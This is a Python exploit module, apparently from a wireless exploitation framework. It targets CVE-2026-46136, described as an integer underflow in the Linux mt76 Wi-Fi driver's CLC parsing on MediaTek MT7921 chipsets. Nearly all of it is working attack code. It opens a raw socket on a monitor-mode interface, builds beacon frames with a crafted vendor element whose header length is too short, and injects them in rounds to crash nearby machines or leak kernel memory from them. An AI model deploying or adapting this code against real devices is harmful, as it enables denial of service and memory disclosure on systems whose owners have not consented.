# Author: André Henrique (LinkedIn/X: @mrhenrike)
import socket
import struct
import time

from wirelessxpl.core.exploit import *
from wirelessxpl.core.exploit.exploit import BaseExploit


class Exploit(BaseExploit):
    """MediaTek mt76 CLC Buffer Underflow (CVE-2026-46136).

    The mt76 WiFi driver in the Linux kernel contains a buffer underflow
    vulnerability in the Channel List Configuration (CLC) parsing code.
    When the firmware sends a CLC response with a header length field
    smaller than the minimum expected size, the driver subtracts the
    header size from the declared length, wrapping the result to a very
    large unsigned value.  This causes a subsequent memcpy to read far
    beyond the source buffer, leaking kernel memory or causing a crash.

    Primarily affects MT7921 chipsets.

    CVSS v3.1: ~7.1 (High), AV:A/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:H

    Author: Andre Henrique (LinkedIn/X: @mrhenrike)
    Version: 1.0.0
    """

    __info__ = {
        "name": "MediaTek mt76 CLC Buffer Underflow (CVE-2026-46136)",
        "description": (
            "Exploits CVE-2026-46136, a buffer underflow in the mt76 "
            "driver's CLC parsing.  A firmware CLC response with a "
            "header length smaller than minimum causes an unsigned "
            "integer underflow in the data length calculation, leading "
            "to a massive over-read that leaks kernel memory or crashes "
            "the system.  Targets MT7921 chipsets."
        ),
        "authors": (
            "Linux kernel wireless team (discovery)",
            "Andre Henrique (@mrhenrike)",
        ),
        "references": (
            "https://nvd.nist.gov/vuln/detail/CVE-2026-46136",
            "https://git.kernel.org/pub/scm/linux/kernel/git/stable/linux.git/",
        ),
        "disclosure_date": "2026-05-20",
        "platform": "linux",
        "arch": "all",
        "privileged": True,
        "targets": (
            "Linux kernels with mt76 driver (vulnerable versions)",
            "MediaTek MT7921 chipsets",
            "Ubuntu, Fedora, Arch (unpatched)",
        ),
    }

    target = OptIP("", "Target station MAC address")
    port = OptPort(1, "Not used (WiFi frame injection)")
    timeout = OptFloat(5.0, "Socket timeout in seconds")
    interface = OptString("wlan0mon", "Monitor-mode wireless interface")
    injection_rounds = OptInteger(16, "Number of crafted beacon rounds")

    _FRAME_TYPE_MGMT = 0x00
    _SUBTYPE_BEACON = 0x08
    _SUBTYPE_PROBE_REQ = 0x04
    _SUBTYPE_ACTION = 0x0D

    _IE_VENDOR_SPECIFIC = 221
    _MTK_OUI = b"\x00\x0C\xE7"

    _BROADCAST = b"\xff\xff\xff\xff\xff\xff"
    _FAKE_BSSID = b"\x02\x00\x00\x00\x00\x01"

    def _build_radiotap_header(self) -> bytes:
        return struct.pack("<BBHI", 0, 0, 8, 0)

    def _build_frame_control(self, subtype: int) -> bytes:
        fc = (self._FRAME_TYPE_MGMT & 0x03) | ((subtype & 0x0F) << 4)
        return struct.pack("<BB", fc, 0x00)

    def _build_clc_vendor_ie(self) -> bytes:
        """Build a crafted MediaTek CLC vendor IE with underflow trigger.

        The CLC header normally has a minimum size of 8 bytes.
        We declare a header length of 2, causing the driver to compute
        data_len = declared_total - header_min, which underflows to a
        very large value.
        """
        vendor_type = struct.pack("B", 0x10)
        clc_header_len = struct.pack("<H", 2)
        clc_total_len = struct.pack("<H", 4)
        clc_data = b"\x00" * 8

        sub_element = vendor_type + clc_header_len + clc_total_len + clc_data
        ie_data = self._MTK_OUI + sub_element
        return struct.pack("BB", self._IE_VENDOR_SPECIFIC, len(ie_data)) + ie_data

    def _build_trigger_beacon(self, seq: int) -> bytes:
        fc = self._build_frame_control(self._SUBTYPE_BEACON)
        duration = struct.pack("<H", 0)
        dst = self._BROADCAST
        src = self._FAKE_BSSID
        seq_ctrl = struct.pack("<H", (seq & 0x0FFF) << 4)
        header = fc + duration + dst + src + src + seq_ctrl

        timestamp = struct.pack("<Q", int(time.time() * 1_000_000) & 0xFFFFFFFFFFFFFFFF)
        beacon_interval = struct.pack("<H", 100)
        capability = struct.pack("<H", 0x0431)
        fixed = timestamp + beacon_interval + capability

        ssid_ie = struct.pack("BB", 0, 7) + b"mt76fuz"
        rates_ie = struct.pack("BB", 1, 4) + bytes([0x82, 0x84, 0x8B, 0x96])
        clc_ie = self._build_clc_vendor_ie()

        body = fixed + ssid_ie + rates_ie + clc_ie
        radiotap = self._build_radiotap_header()
        return radiotap + header + body

    def _build_probe_request(self) -> bytes:
        fc = self._build_frame_control(self._SUBTYPE_PROBE_REQ)
        duration = struct.pack("<H", 0)
        header = fc + duration + self._BROADCAST + self._FAKE_BSSID + self._BROADCAST + struct.pack("<H", 0)
        ssid_ie = struct.pack("BB", 0, 0)
        rates_ie = struct.pack("BB", 1, 4) + bytes([0x02, 0x04, 0x0B, 0x16])
        radiotap = self._build_radiotap_header()
        return radiotap + header + ssid_ie + rates_ie

    def _inject_frame(self, raw_sock: socket.socket, frame: bytes) -> bool:
        try:
            raw_sock.send(frame)
            return True
        except OSError:
            return False

    def _open_raw_wifi(self) -> socket.socket | None:
        try:
            sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
            sock.settimeout(self.timeout)
            sock.bind((str(self.interface), 0))
            return sock
        except OSError:
            return None

    @mute
    def check(self) -> bool:
        raw = self._open_raw_wifi()
        if raw is None:
            return False
        try:
            probe = self._build_probe_request()
            self._inject_frame(raw, probe)
            return True
        finally:
            raw.close()

    def run(self) -> None:
        if not self.interface:
            print_error("interface is required (e.g. wlan0mon)")
            return
        if not self.check():
            print_error("Cannot open raw socket on monitor interface")
            return
        print_success("Monitor-mode socket established; injecting CLC underflow beacons")
        self._exploit()

    def _exploit(self) -> None:
        raw = self._open_raw_wifi()
        if raw is None:
            print_error("Failed to open raw socket")
            return

        print_status(
            f"Injecting {self.injection_rounds} beacons with "
            f"crafted CLC vendor IE (underflow trigger)"
        )

        success = 0
        for rnd in range(self.injection_rounds):
            beacon = self._build_trigger_beacon(rnd)
            if self._inject_frame(raw, beacon):
                success += 1
            time.sleep(0.02)

        raw.close()

        print_status(f"Injected {success}/{self.injection_rounds} CLC beacons")
        print_info(
            "The CLC vendor IE declares a header length smaller than "
            "the minimum, causing unsigned integer underflow in the "
            "mt76 driver.  If the target uses MT7921, the driver will "
            "attempt a massive over-read, leaking memory or crashing."
        )
